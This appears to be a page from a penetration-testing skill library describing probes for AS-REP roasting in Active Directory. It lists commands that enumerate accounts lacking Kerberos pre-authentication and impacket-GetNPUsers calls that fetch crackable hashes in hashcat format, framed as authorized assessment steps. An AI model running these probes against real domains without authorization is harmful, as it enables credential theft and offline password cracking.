# Diagnostic Verification Probes and Code Patterns

> Sub-skill: [`active-directory-kerberos-attacks-asrep-roasting`](SKILL.md) | Family: **Network, Active Directory and Endpoint**

Probes owned by `active-directory-kerberos-attacks-asrep-roasting`. Each one reads state or makes a single benign authorized request: none writes, escalates, or persists. Record the benign baseline first, then compare the differential stated with the probe.

## Roastable set from attributes

**Expected differential.** A user object with the pre-auth flag set is the set; no network request is needed to identify it.

```bash
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties userAccountControl,msDS-SupportedEncryptionTypes
netexec ldap 10.20.30.10 -u lowpriv -p pass --query '(userAccountControl:1.2.840.113556.1.4.803:=4194304)' sAMAccountName
```

## Unauthenticated request

**Expected differential.** An AS-REP returned without a credential proves the exposure; a pre-auth-required error proves the control.

```bash
impacket-GetNPUsers corp.example/ -usersfile candidates.txt -dc-ip 10.20.30.10 -no-pass -format hashcat
impacket-GetNPUsers corp.example/svc_legacy -dc-ip 10.20.30.10 -no-pass
```

## Usage Rules

- Run only inside the scope named in the engagement letter or lab charter.
- Change one variable per probe so the differential is attributable to one control.
- Pair every confirmed finding with the structural fix in [`SKILL.md`](SKILL.md).
